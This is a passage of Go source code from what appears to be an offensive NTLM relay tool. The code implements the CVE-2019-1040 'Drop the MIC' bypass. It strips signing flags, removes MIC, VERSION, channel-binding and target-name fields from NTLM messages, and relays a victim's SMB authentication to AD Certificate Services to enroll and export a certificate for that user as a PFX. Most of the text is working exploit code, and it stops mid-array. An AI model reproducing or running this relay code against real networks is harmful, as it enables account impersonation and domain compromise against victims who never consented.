		avLen := binary.LittleEndian.Uint16(type2[offset+2 : offset+4])

		if avID == 0 { // MsvAvEOL
			break
		}

		if avID == 9 { // MsvAvTargetName
			targetNameOffset = offset
			targetNameTotalLen = 4 + uint32(avLen) // ID + Length + Value
			oldSPNBytes := type2[offset+4 : offset+4+uint32(avLen)]
			oldSPN := decodeUTF16LE(oldSPNBytes)
			logger.Debug(fmt.Sprintf("Found MsvAvTargetName in Type 2: %s (will remove)", oldSPN))
			break
		}

		offset += 4 + uint32(avLen)
	}

	if targetNameOffset == 0 {
		logger.Debug("No MsvAvTargetName found in Type 2, no modification needed")
		return type2
	}

	// Remove the MsvAvTargetName entry
	modified := make([]byte, 0, len(type2)-int(targetNameTotalLen))
	modified = append(modified, type2[:targetNameOffset]...)
	modified = append(modified, type2[targetNameOffset+targetNameTotalLen:]...)

	// Update TargetInfo length in the descriptor
	newTargetInfoLen := targetInfoLen - uint16(targetNameTotalLen)
	binary.LittleEndian.PutUint16(modified[40:42], newTargetInfoLen)
	binary.LittleEndian.PutUint16(modified[42:44], newTargetInfoLen) // maxlen

	logger.Debug(fmt.Sprintf("Removed MsvAvTargetName from Type 2, new size: %d bytes (was %d)", len(modified), len(type2)))
	return modified
}

// removeSigningFlagsFromType2 removes signing-related flags from NTLM Type 2 challenge
// This is used for cross-protocol relay (HTTP→LDAP) to prevent the client from
// negotiating signing, which would require MIC validation that we can't provide
// This matches ntlmrelayx behavior for cross-protocol relay
func (h *HTTPRelayHandler) removeSigningFlagsFromType2(type2 []byte) []byte {
	if len(type2) < 24 {
		return type2
	}

	// Flags are at offset 20 (4 bytes)
	const (
		NTLMSSP_NEGOTIATE_SIGN        = 0x00000010
		NTLMSSP_NEGOTIATE_ALWAYS_SIGN = 0x00008000
	)

	flags := binary.LittleEndian.Uint32(type2[20:24])
	originalFlags := flags

	// Remove signing flags
	if flags&NTLMSSP_NEGOTIATE_SIGN != 0 {
		flags &^= NTLMSSP_NEGOTIATE_SIGN
		h.logger.Debug("Removed NTLMSSP_NEGOTIATE_SIGN flag from Type 2")
	}
	if flags&NTLMSSP_NEGOTIATE_ALWAYS_SIGN != 0 {
		flags &^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
		h.logger.Debug("Removed NTLMSSP_NEGOTIATE_ALWAYS_SIGN flag from Type 2")
	}

	if flags != originalFlags {
		// Make a copy and update flags
		modified := make([]byte, len(type2))
		copy(modified, type2)
		binary.LittleEndian.PutUint32(modified[20:24], flags)
		return modified
	}

	return type2
}

// removeMICFromType3 removes the MIC (Message Integrity Check) from NTLM Type 3
// This is used for cross-protocol relay (HTTP→LDAP) when we've modified the Type 2 challenge
// The client computed the MIC based on the modified Type 2 (without signing flags),
// but the LDAP server expects MIC based on original Type 2, so we must remove it
// This is part of CVE-2019-1040 "Drop the MIC" attack
func (h *HTTPRelayHandler) removeMICFromType3(type3 []byte) []byte {
	if len(type3) < 64 {
		h.logger.Debug("Type 3 too short for MIC removal")
		return type3
	}

	// Check signature
	if string(type3[0:8]) != "NTLMSSP\x00" {
		h.logger.Debug("Type 3 missing NTLMSSP signature")
		return type3
	}

	// Check message type
	msgType := binary.LittleEndian.Uint32(type3[8:12])
	if msgType != 3 {
		h.logger.Debug(fmt.Sprintf("Not a Type 3 message: %d", msgType))
		return type3
	}

	// Flags are at offset 60 (4 bytes)
	const NTLMSSP_NEGOTIATE_SIGN = 0x00000010
	flags := binary.LittleEndian.Uint32(type3[60:64])

	// Only remove MIC if signing was negotiated (indicates MIC is present)
	if flags&NTLMSSP_NEGOTIATE_SIGN == 0 {
		h.logger.Debug("No signing flag in Type 3, no MIC to remove")
		return type3
	}

	// MIC is 16 bytes and located in the message header
	// Type 3 structure per MS-NLMP:
	//   0-7:  Signature "NTLMSSP\0"
	//   8-11: MessageType (0x03)
	//  12-19: LmChallengeResponse (len, maxlen, offset)
	//  20-27: NtChallengeResponse (len, maxlen, offset)
	//  28-35: DomainName (len, maxlen, offset)
	//  36-43: UserName (len, maxlen, offset)
	//  44-51: Workstation (len, maxlen, offset)
	//  52-59: SessionKey (len, maxlen, offset)
	//  60-63: NegotiateFlags
	//  64-71: Version (8 bytes, optional - only if NTLMSSP_NEGOTIATE_VERSION flag is set)
	//  72-87: MIC (16 bytes, when present)
	//
	// The MIC field is at offset 72 if Version is present, or offset 64 if not
	// According to MS-NLMP, MIC is stored at offset 72 in most implementations

	// Calculate MIC offset based on Version field presence
	const NTLMSSP_NEGOTIATE_VERSION = 0x02000000
	micOffset := 64
	if flags&NTLMSSP_NEGOTIATE_VERSION != 0 {
		micOffset = 72 // Version field is present (8 bytes)
	}

	// Check if there's enough data for MIC
	if len(type3) < micOffset+16 {
		h.logger.Debug(fmt.Sprintf("Type 3 too short to contain MIC at offset %d", micOffset))
		return type3
	}

	// Zero out the MIC field (don't remove bytes, just zero them)
	// This is what ntlmrelayx does - it zeros the MIC rather than truncating
	modified := make([]byte, len(type3))
	copy(modified, type3)
	for i := micOffset; i < micOffset+16; i++ {
		modified[i] = 0
	}

	h.logger.Debug(fmt.Sprintf("Removed MIC from Type 3 (zeroed 16 bytes at offset %d)", micOffset))
	return modified
}

// removeSigningFlags removes NTLM signing/sealing flags from Type 1 for LDAPS compatibility
// When using LDAPS (TLS), the DC rejects NTLM signing/sealing because TLS already provides encryption
func removeSigningFlags(type1 []byte) []byte {
	if len(type1) < 20 {
		return type1
	}

	// Check for NTLMSSP signature
	if string(type1[0:8]) != "NTLMSSP\x00" {
		return type1
	}

	// Make a copy
	modified := make([]byte, len(type1))
	copy(modified, type1)

	// Flags are at offset 12-15 (4 bytes, little-endian)
	flags := binary.LittleEndian.Uint32(modified[12:16])

	// Remove signing flags exactly like ntlmrelayx does for CVE-2019-1040 (Drop the MIC)
	// This is required for SMB->LDAP relay to avoid LDAP signing requirement
	flags &^= ntlm.NegotiateSign       // 0x00000010
	flags &^= ntlm.NegotiateAlwaysSign // 0x00008000

	// Write modified flags back
	binary.LittleEndian.PutUint32(modified[12:16], flags)

	return modified
}

// removeVersionAndMIC zeros VERSION and MIC fields in NTLM Type 3 message
// removeVersionAndMIC implements CVE-2019-1040 (Drop the MIC) exactly like ntlmrelayx.
// It REMOVES the VERSION (8 bytes) and MIC (16 bytes) fields entirely from the message,
// adjusting all payload offsets by -24 bytes. This matches ntlmrelayx behavior where setting
// MICLen=0 and VersionLen=0 causes getData() to exclude those fields from the output.
func removeVersionAndMIC(type3 []byte) []byte {
	if len(type3) < 88 {
		log.Printf("[DEBUG] removeVersionAndMIC: Type 3 too short (%d bytes)", len(type3))
		return type3
	}

	// Verify NTLMSSP signature
	if string(type3[0:8]) != "NTLMSSP\x00" {
		log.Printf("[DEBUG] removeVersionAndMIC: Invalid NTLMSSP signature")
		return type3
	}

	originalFlags := binary.LittleEndian.Uint32(type3[60:64])
	log.Printf("[DEBUG] removeVersionAndMIC: Original flags=0x%08x, msgLen=%d",
		originalFlags, len(type3))

	// Check if VERSION and MIC are present
	hasVersion := (originalFlags & ntlm.NegotiateVersion) != 0
	hasMIC := hasVersion // MIC only exists if VERSION exists

	if !hasVersion || !hasMIC {
		log.Printf("[DEBUG] removeVersionAndMIC: No VERSION/MIC to remove")
		return type3
	}

	// We need to:
	// 1. Remove bytes 64-87 (VERSION=8 bytes, MIC=16 bytes, total 24 bytes)
	// 2. Adjust all offset fields in the security buffers (offsets 12-59) by -24
	// 3. Clear the flags

	// Build new message: header (64 bytes) + payload (starting from original offset 88)
	modified := make([]byte, len(type3)-24)

	// Copy header (first 64 bytes, up to flags)
	copy(modified[0:64], type3[0:64])

	// Modify flags
	flags := originalFlags
	flags &^= ntlm.NegotiateSign        // 0x00000010
	flags &^= ntlm.NegotiateAlwaysSign  // 0x00008000
	flags &^= ntlm.NegotiateKeyExchange // 0x40000000
	flags &^= ntlm.NegotiateVersion     // 0x02000000
	binary.LittleEndian.PutUint32(modified[60:64], flags)

	log.Printf("[DEBUG] removeVersionAndMIC: Modified flags=0x%08x", flags)
	log.Printf("[DEBUG] removeVersionAndMIC: Removing VERSION+MIC (24 bytes)")

	// Adjust all security buffer offsets (each buffer is Length|MaxLength|Offset = 2+2+4 = 8 bytes)
	// Buffers are at offsets: 12 (LM), 20 (NTLM), 28 (Domain), 36 (User), 44 (Workstation), 52 (Session Key)
	for i := 12; i < 60; i += 8 {
		offset := binary.LittleEndian.Uint32(modified[i+4 : i+8])
		if offset >= 88 { // Only adjust offsets that point past the removed fields
			newOffset := offset - 24
			binary.LittleEndian.PutUint32(modified[i+4:i+8], newOffset)
			log.Printf("[DEBUG] removeVersionAndMIC: Adjusted offset at pos %d: %d -> %d", i+4, offset, newOffset)
		}
	}

	// Copy payload (everything after VERSION+MIC, starting from original offset 88)
	copy(modified[64:], type3[88:])

	log.Printf("[DEBUG] removeVersionAndMIC: Message size: %d -> %d bytes (removed 24 bytes)",
		len(type3), len(modified))

	return modified
}

// clearMICFlagInAVPairs clears the MIC Present flag (0x00000002) in the AV_PAIRS
// within the NTLMv2 response blob. This is necessary because even though we remove
// the MIC field from the message, the AV_PAIRS still indicate MIC is present,
// causing the DC to reject authentication.
func clearMICFlagInAVPairs(type3 []byte) []byte {
	// NTLM Response descriptor is at offset 20-27
	if len(type3) < 28 {
		return type3
	}

	ntlmRespLen := binary.LittleEndian.Uint16(type3[20:22])
	ntlmRespOffset := binary.LittleEndian.Uint32(type3[24:28])

	if ntlmRespOffset+uint32(ntlmRespLen) > uint32(len(type3)) {
		log.Printf("[DEBUG] clearMICFlagInAVPairs: Invalid NTLM response offset/length")
		return type3
	}

	// NTLMv2 Response structure:
	// Offset 0-15: Response (HMAC-MD5)
	// Offset 16-43: Header fields
	// Offset 44+: AV_PAIRS (attribute-value pairs)

	if ntlmRespLen < 44 {
		log.Printf("[DEBUG] clearMICFlagInAVPairs: NTLMv2 response too short for AV_PAIRS")
		return type3
	}

	// Make a copy to modify
	modified := make([]byte, len(type3))
	copy(modified, type3)

	// Parse AV_PAIRS starting at offset 44 within the NTLMv2 response
	avPairsStart := ntlmRespOffset + 44
	offset := avPairsStart

	for offset < ntlmRespOffset+uint32(ntlmRespLen)-4 {
		if int(offset+4) > len(modified) {
			break
		}
		avID := binary.LittleEndian.Uint16(modified[offset : offset+2])
		avLen := binary.LittleEndian.Uint16(modified[offset+2 : offset+4])

		if avID == 0 { // MsvAvEOL
			break
		}

		// MsvAvFlags = 6
		if avID == 6 && avLen == 4 {
			if int(offset+8) > len(modified) {
				break
			}
			flags := binary.LittleEndian.Uint32(modified[offset+4 : offset+8])
			const MIC_PRESENT = 0x00000002

			if flags&MIC_PRESENT != 0 {
				// Clear the MIC Present flag
				flags &^= MIC_PRESENT
				binary.LittleEndian.PutUint32(modified[offset+4:offset+8], flags)
				log.Printf("[DEBUG] clearMICFlagInAVPairs: Cleared MIC Present flag")
			}
			break
		}

		offset += 4 + uint32(avLen)
	}

	return modified
}

// removeChannelBindings zeros MsvAvChannelBindings (ID=10) data in NTLM Type 3 AV_PAIRS
// This is critical for cross-TLS-channel relay (e.g., SMB with TLS → LDAPS)
// The client calculates channel bindings based on SMB's TLS cert, but we're relaying to LDAPS
// We ZERO the data instead of removing the AVPair to keep the structure intact for HMAC validation
func removeChannelBindings(type3 []byte) []byte {
	if len(type3) < 88 {
		return type3
	}

	// Make a copy to avoid modifying original
	modified := make([]byte, len(type3))
	copy(modified, type3)

	// NTLM Response descriptor is at offset 20-27
	ntlmRespLen := binary.LittleEndian.Uint16(modified[20:22])
	ntlmRespOffset := binary.LittleEndian.Uint32(modified[24:28])

	if ntlmRespOffset+uint32(ntlmRespLen) > uint32(len(modified)) {
		return modified // Invalid structure
	}

	// Make sure we have at least the NTLMv2 response header
	if ntlmRespLen < 44 {
		return modified // Too short for AV_PAIRS
	}

	// Parse AV_PAIRS starting at offset 44 within the NTLMv2 response
	avPairsStart := ntlmRespOffset + 44
	offset := avPairsStart

	// Find MsvAvChannelBindings (ID=10) and zero its data
	for offset < ntlmRespOffset+uint32(ntlmRespLen)-4 {
		avID := binary.LittleEndian.Uint16(modified[offset : offset+2])
		avLen := binary.LittleEndian.Uint16(modified[offset+2 : offset+4])

		if avID == 0 { // MsvAvEOL
			break
		}

		if avID == 10 { // MsvAvChannelBindings
			fmt.Printf("[DEBUG] removeChannelBindings: Found MsvAvChannelBindings at offset %d, len %d\n", offset, avLen)

			// Zero out the channel bindings data (keep the AVPair header intact)
			dataStart := offset + 4
			for i := uint32(0); i < uint32(avLen); i++ {
				modified[dataStart+i] = 0
			}

			fmt.Printf("[DEBUG] removeChannelBindings: Zeroed channel bindings data (%d bytes)\n", avLen)
			return modified
		}

		offset += 4 + uint32(avLen)
	}

	fmt.Printf("[DEBUG] removeChannelBindings: No channel bindings found\n")
	return modified
}

// rewriteTargetSPN removes the MsvAvTargetName (AVPair ID=9) from the NTLM Type 3 message
// for cross-protocol relay (SMB→HTTP). The client's Type 3 contains "cifs/hostname" but
// modifying it would invalidate the NTLMv2 response HMAC. Instead, we remove it entirely.
func rewriteTargetSPN(type3 []byte, targetURL string, logger *output.Logger) []byte {
	logger.Debug("Removing MsvAvTargetName (AVPair ID=9) for cross-protocol relay")

	// NTLM Response descriptor is at offset 20-27
	if len(type3) < 28 {
		return type3
	}

	ntlmRespLen := binary.LittleEndian.Uint16(type3[20:22])
	ntlmRespOffset := binary.LittleEndian.Uint32(type3[24:28])

	if ntlmRespOffset+uint32(ntlmRespLen) > uint32(len(type3)) {
		logger.Debug("Invalid NTLM response offset/length")
		return type3
	}

	// Make sure we have at least the NTLMv2 response header
	if ntlmRespLen < 44 {
		logger.Debug("NTLMv2 response too short for AV_PAIRS")
		return type3
	}

	// Parse AV_PAIRS starting at offset 44 within the NTLMv2 response
	avPairsStart := ntlmRespOffset + 44
	offset := avPairsStart

	// Find MsvAvTargetName (ID=9)
	for offset < ntlmRespOffset+uint32(ntlmRespLen)-4 {
		avID := binary.LittleEndian.Uint16(type3[offset : offset+2])
		avLen := binary.LittleEndian.Uint16(type3[offset+2 : offset+4])

		if avID == 0 { // MsvAvEOL
			break
		}

		// MsvAvTargetName = 9
		if avID == 9 {
			// Found the target SPN, remove it entirely
			oldSPNBytes := type3[offset+4 : offset+4+uint32(avLen)]
			oldSPN := decodeUTF16LE(oldSPNBytes)
			logger.Debug(fmt.Sprintf("Found MsvAvTargetName: %s (removing it)", oldSPN))

			// Build new Type 3 without this AVPair
			modified := make([]byte, 0, len(type3)-int(avLen)-4)

			// Everything before the AVPair
			modified = append(modified, type3[:offset]...)

			// Everything after the AVPair (skip the 4-byte header + value)
			modified = append(modified, type3[offset+4+uint32(avLen):]...)

			// Update the NtChallengeResponse length in the Type 3 header
			newNtlmRespLen := ntlmRespLen - uint16(avLen) - 4 // 4 bytes for AVPair header
			binary.LittleEndian.PutUint16(modified[20:22], newNtlmRespLen)
			binary.LittleEndian.PutUint16(modified[22:24], newNtlmRespLen)

			logger.Debug(fmt.Sprintf("Removed MsvAvTargetName, new size: %d bytes (was %d)", len(modified), len(type3)))
			return modified
		}

		offset += 4 + uint32(avLen)
	}

	logger.Debug("MsvAvTargetName (ID=9) not found in AV_PAIRS")
	return type3
}

// Helper functions for UTF-16LE encoding/decoding
func decodeUTF16LE(b []byte) string {
	if len(b)%2 != 0 {
		return ""
	}
	u16s := make([]uint16, len(b)/2)
	for i := 0; i < len(u16s); i++ {
		u16s[i] = binary.LittleEndian.Uint16(b[i*2:])
	}
	return string(utf16.Decode(u16s))
}

func encodeUTF16LE(s string) []byte {
	u16s := utf16.Encode([]rune(s))
	b := make([]byte, len(u16s)*2)
	for i, u := range u16s {
		binary.LittleEndian.PutUint16(b[i*2:], u)
	}
	return b
}

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ADCSRelayHandler handles NTLM relay for ADCS certificate enrollment
type ADCSRelayHandler struct {
	conn              net.Conn
	adcsClient        *ADCSClient
	authenticatedUser string // Store the username from Type 3 for naming the PFX file
	outputPath        string
	pfxPass           string
	logger            *output.Logger
	onSuccess         func(pfxPath string)
	privateKey        *rsa.PrivateKey // Store private key for certificate enrollment
	server            *Server         // Reference to server for first-success tracking
}

// Handle performs the ADCS relay
func (h *ADCSRelayHandler) Handle(ctx context.Context) error {
	// Create a done channel for context cancellation
	done := make(chan struct{})
	defer close(done)
	go func() {
		select {
		case <-ctx.Done():
			h.conn.Close()
		case <-done:
		}
	}()

	// Generate RSA key pair BEFORE authentication
	// This is needed because NTLM auth must happen on the POST request with CSR data
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("failed to generate RSA key: %w", err)
	}
	h.privateKey = privateKey

	// Connect to ADCS
	if err := h.adcsClient.Connect(); err != nil {
		return fmt.Errorf("failed to connect to ADCS: %w", err)
	}
	defer h.adcsClient.Close()

	// Prepare CSR BEFORE starting authentication
	// This is critical - the CSR must be ready before Type 1 is sent
	if err := h.adcsClient.PrepareCSR(privateKey, ""); err != nil {
		return fmt.Errorf("failed to prepare CSR: %w", err)
	}

	// Process SMB packets
	for {
		// Read NetBIOS header
		netbiosHeader := make([]byte, 4)
		_, err := io.ReadFull(h.conn, netbiosHeader)
		if err != nil {
			if err == io.EOF {
				return nil
			}
			return fmt.Errorf("failed to read NetBIOS header: %w", err)
		}

		length := int(netbiosHeader[1])<<16 | int(netbiosHeader[2])<<8 | int(netbiosHeader[3])

		// Read SMB packet
		packet := make([]byte, length)
		_, err = io.ReadFull(h.conn, packet)
		if err != nil {
			return fmt.Errorf("failed to read SMB packet: %w", err)
		}

		// Process packet
		response, success, err := h.processPacket(packet)
		if err != nil {
			h.logger.Debug(fmt.Sprintf("Error processing packet: %v", err))
			return err
		}

		// Send response
		if response != nil {
			if err := h.sendResponse(response); err != nil {
				return fmt.Errorf("failed to send response: %w", err)
			}
		}

		// If relay succeeded, perform certificate enrollment
		if success {
			h.logger.Success("NTLM relay successful!")
			return h.performCertificateEnrollment()
		}
	}
}

// processPacket processes an SMB packet and relays NTLM to ADCS
func (h *ADCSRelayHandler) processPacket(packet []byte) ([]byte, bool, error) {
	if len(packet) < 4 {
		return nil, false, fmt.Errorf("packet too short")
	}

	// Check if SMB1 or SMB2
	if packet[0] == 0xFF && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B' {
		return h.processSMB1Packet(packet)
	} else if packet[0] == 0xFE && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B' {
		return h.processSMB2Packet(packet)
	}

	return nil, false, fmt.Errorf("unknown protocol")
}

// processSMB2Packet processes an SMB2 packet for ADCS relay
func (h *ADCSRelayHandler) processSMB2Packet(packet []byte) ([]byte, bool, error) {
	header, err := smb.ParseSMB2Header(packet)
	if err != nil {
		return nil, false, err
	}

	switch header.Command {
	case smb.SMB2_NEGOTIATE:
		h.logger.Debug("Received SMB2_NEGOTIATE")
		response := h.buildSMB2NegotiateResponse(header)
		return response, false, nil

	case smb.SMB2_SESSION_SETUP:
		h.logger.Debug("Received SMB2_SESSION_SETUP")
		return h.handleSessionSetupRelay(packet)

	default:
		h.logger.Debug(fmt.Sprintf("Unsupported SMB2 command: 0x%04x", header.Command))
		return nil, false, fmt.Errorf("unsupported SMB2 command: 0x%04x", header.Command)
	}
}

// processSMB1Packet processes an SMB1 packet for ADCS relay
func (h *ADCSRelayHandler) processSMB1Packet(packet []byte) ([]byte, bool, error) {
	if len(packet) >= 5 && packet[4] == 0x72 { // SMB_COM_NEGOTIATE
		dialects, err := h.parseSMB1Dialects(packet)
		if err != nil {
			return nil, false, fmt.Errorf("failed to parse SMB1 dialects: %w", err)
		}

		h.logger.Debug(fmt.Sprintf("Client dialects: %v", dialects))

		for _, dialect := range dialects {
			if len(dialect) >= 5 && dialect[:5] == "SMB 2" {
				h.logger.Debug(fmt.Sprintf("Client advertised SMB2 (%s), responding with SMB2 NEGOTIATE", dialect))
				response := h.buildSMB2NegotiateFromSMB1(packet)
				return response, false, nil
			}
		}

		h.logger.Debug("Client doesn't support SMB2, rejecting")
		header, _ := smb.ParseSMB1Header(packet)
		response := smb.BuildSMB1NegotiateResponse(header, 0xFFFF)
		return response, false, nil
	}

	h.logger.Debug("Received unsupported SMB1 command")
	return nil, false, fmt.Errorf("unsupported SMB1 command")
}

// handleSessionSetupRelay handles SMB2 SESSION_SETUP and relays NTLM to ADCS
func (h *ADCSRelayHandler) handleSessionSetupRelay(packet []byte) ([]byte, bool, error) {
	if len(packet) < 64+9 {
		return nil, false, fmt.Errorf("session setup request too short")
	}

	offset := 64 + 12
	securityBufferOffset := binary.LittleEndian.Uint16(packet[offset : offset+2])
	securityBufferLength := binary.LittleEndian.Uint16(packet[offset+2 : offset+4])

	if int(securityBufferOffset)+int(securityBufferLength) > len(packet) {
		return nil, false, fmt.Errorf("security buffer out of bounds")
	}

	securityBlob := packet[securityBufferOffset : securityBufferOffset+securityBufferLength]

	// Unwrap SPNEGO
	ntlmMsg, err := smb.UnwrapSPNEGO(securityBlob)
	if err != nil {
		return nil, false, fmt.Errorf("failed to unwrap SPNEGO: %w", err)
	}

	if len(ntlmMsg) < 12 {
		return nil, false, fmt.Errorf("NTLM message too short")
	}

	msgType := binary.LittleEndian.Uint32(ntlmMsg[8:12])

	switch msgType {
	case ntlm.NtLmNegotiate:
		h.logger.Info("Relaying NTLM Type 1 to ADCS...")
		h.logger.Debug(fmt.Sprintf("Type 1 from SMB client: %d bytes", len(ntlmMsg)))
		if len(ntlmMsg) <= 100 {
			h.logger.Debug(fmt.Sprintf("Type 1 hex: %x", ntlmMsg))
		}

		type2, err := h.adcsClient.ForwardNegotiate(ntlmMsg)
		if err != nil {
			return nil, false, fmt.Errorf("failed to forward negotiate: %w", err)
		}

		h.logger.Debug(fmt.Sprintf("Type 2 from ADCS: %d bytes", len(type2)))

		// CRITICAL: For cross-protocol relay (SMB→HTTP), we must remove MsvAvTargetName
		// from the Type 2 challenge before sending to the SMB client.
		// The SMB client will add its own MsvAvTargetName based on the hostname it connected to,
		// which will be our relay server (e.g., "cifs/bingbong4"). But ADCS expects the
		// MsvAvTargetName to match the hostname in the Type 2 challenge.
		// By removing it from Type 2, the client won't include it in Type 3, and ADCS
		// won't validate it.
		modifiedType2 := removeTargetNameFromType2(type2, h.logger)
		h.logger.Debug(fmt.Sprintf("Modified Type 2 size: %d bytes (original: %d)", len(modifiedType2), len(type2)))

		// Wrap in SPNEGO
		spnegoBlob := smb.WrapNTLMInSPNEGO(modifiedType2, true)

		header, _ := smb.ParseSMB2Header(packet)
		response := smb.BuildSessionSetupResponse(header, smb.STATUS_MORE_PROCESSING_REQUIRED, 0x1000000000001, spnegoBlob)
		return response, false, nil

	case ntlm.NtLmAuthenticate:
		h.logger.Info("Relaying NTLM Type 3 to ADCS...")
		h.logger.Debug(fmt.Sprintf("Type 3 from SMB client: %d bytes", len(ntlmMsg)))

		// Log full Type 3 hex for analysis
		h.logger.Debug(fmt.Sprintf("Full Type 3 hex: %x", ntlmMsg))

		// Parse the Type 3 message to extract the username
		parser := ntlm.NewAuthParser()
		authMsg, parseErr := parser.Parse(ntlmMsg)
		var csrUsername string
		if parseErr == nil {
			username := authMsg.GetUserName()
			domain := authMsg.GetDomain()
			csrUsername = username // CSR subject is just the username, not domain\username
			if domain != "" {
				h.authenticatedUser = domain + "\\" + username
			} else {
				h.authenticatedUser = username
			}
			h.logger.Debug(fmt.Sprintf("Authenticated user: %s", h.authenticatedUser))

			// Check if this is the first successful relay
			if h.server != nil && !h.server.markFirstSuccess(h.authenticatedUser) {
				// Another relay already succeeded, reject this one
				header, _ := smb.ParseSMB2Header(packet)
				response := smb.BuildSessionSetupResponse(header, smb.STATUS_LOGON_FAILURE, 0, nil)
				return response, false, nil
			}
		}

		// Regenerate CSR with the authenticated username as subject (if we have it)
		// This is critical - the CSR sent with Type 1 had a generic "certuser" subject,
		// but now we know the actual username, so regenerate with correct subject
		if csrUsername != "" {
			h.logger.Info(fmt.Sprintf("Regenerating CSR with subject: %s", csrUsername))
			if err := h.adcsClient.PrepareCSR(h.privateKey, csrUsername); err != nil {
				h.logger.Error(fmt.Sprintf("Failed to regenerate CSR: %v", err))
				header, _ := smb.ParseSMB2Header(packet)
				response := smb.BuildSessionSetupResponse(header, smb.STATUS_LOGON_FAILURE, 0, nil)
				return response, false, err
			}
		}

		// TEST: Try sending Type 3 completely unmodified
		// Theory: ADCS might not actually validate the MsvAvTargetName SPN
		// The MIC flag is already false, so no MIC to remove
		h.logger.Debug("Testing unmodified Type 3 relay for SMB→HTTP")

		// Log original flags
		if len(ntlmMsg) >= 64 {
			origFlags := binary.LittleEndian.Uint32(ntlmMsg[60:64])
			h.logger.Debug(fmt.Sprintf("Type 3 flags: 0x%08x (MIC flag: %v)", origFlags, (origFlags&0x00000002) != 0))
		}

		// Send Type 3 UNCHANGED
		err := h.adcsClient.ForwardAuthenticate(ntlmMsg)
		if err != nil {
			h.logger.Error(fmt.Sprintf("ADCS authentication failed: %v", err))
			header, _ := smb.ParseSMB2Header(packet)
			response := smb.BuildSessionSetupResponse(header, smb.STATUS_LOGON_FAILURE, 0, nil)
			return response, false, err
		}

		header, _ := smb.ParseSMB2Header(packet)
		response := smb.BuildSessionSetupResponse(header, smb.STATUS_SUCCESS, 0x1000000000001, nil)
		return response, true, nil

	default:
		return nil, false, fmt.Errorf("unknown NTLM message type: %d", msgType)
	}
}

// sendResponse sends an SMB response with NetBIOS header
func (h *ADCSRelayHandler) sendResponse(data []byte) error {
	header := make([]byte, 4)
	header[0] = 0x00
	length := len(data)
	header[1] = byte(length >> 16)
	header[2] = byte(length >> 8)
	header[3] = byte(length)

	if _, err := h.conn.Write(header); err != nil {
		return err
	}

	if _, err := h.conn.Write(data); err != nil {
		return err
	}

	return nil
}

// performCertificateEnrollment requests a certificate from ADCS
func (h *ADCSRelayHandler) performCertificateEnrollment() error {
	h.logger.Info("Requesting certificate from ADCS...")

	// Note: private key was already generated and CSR prepared before authentication
	// Authentication happened on the POST request with the CSR data
	// Now we just need to extract the certificate from the Type 3 response

	// Request certificate from ADCS (this will use the already-authenticated connection)
	cert, err := h.adcsClient.RequestCertificate(h.privateKey, "")
	if err != nil {
		return fmt.Errorf("failed to request certificate: %w", err)
	}

	// Export PFX with username-based filename
	pfxPath := h.outputPath
	if pfxPath == "" || pfxPath == "certificate.pfx" {
		// Use authenticated username for the filename
		if h.authenticatedUser != "" {
			// Replace backslash with underscore for filename safety
			safeUsername := h.authenticatedUser
			safeUsername = strings.ReplaceAll(safeUsername, "\\", "_")
			safeUsername = strings.ReplaceAll(safeUsername, "$", "")
			pfxPath = safeUsername + ".pfx"
		} else {
			pfxPath = "certificate.pfx"
		}
	}

	pfxPassword, err := shadowcreds.ExportPFX(h.privateKey, cert, h.pfxPass, pfxPath)
	if err != nil {
		return fmt.Errorf("failed to export PFX: %w", err)
	}

	h.logger.Success(fmt.Sprintf("Certificate exported to: %s", pfxPath))
	h.logger.Info(fmt.Sprintf("PFX Password: %s", pfxPassword))

	if h.onSuccess != nil {
		h.onSuccess(h.outputPath)
	}

	return nil
}

// buildSMB2NegotiateFromSMB1 builds an SMB2 NEGOTIATE response from SMB1 request
func (h *ADCSRelayHandler) buildSMB2NegotiateFromSMB1(smb1Packet []byte) []byte {
	smb1Header, _ := smb.ParseSMB1Header(smb1Packet)

	response := make([]byte, 128)
	offset := 0

	copy(response[offset:offset+4], []byte{0xFE, 'S', 'M', 'B'})
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], 64)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0)
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 1)
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(smb1Header.MID))
	offset += 8
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], 0)
	offset += 8
	offset += 16

	binary.LittleEndian.PutUint16(response[offset:offset+2], 65)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE_SIGNING_ENABLED|smb.SMB2_NEGOTIATE_SIGNING_REQUIRED)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0x0202)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0)
	offset += 2
	guid := []byte{0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF}
	copy(response[offset:offset+16], guid)
	offset += 16
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000)
	offset += 8
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000)
	offset += 8

	securityBlob := []byte{
		0x60, 0x48, 0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02, 0xa0, 0x3e,
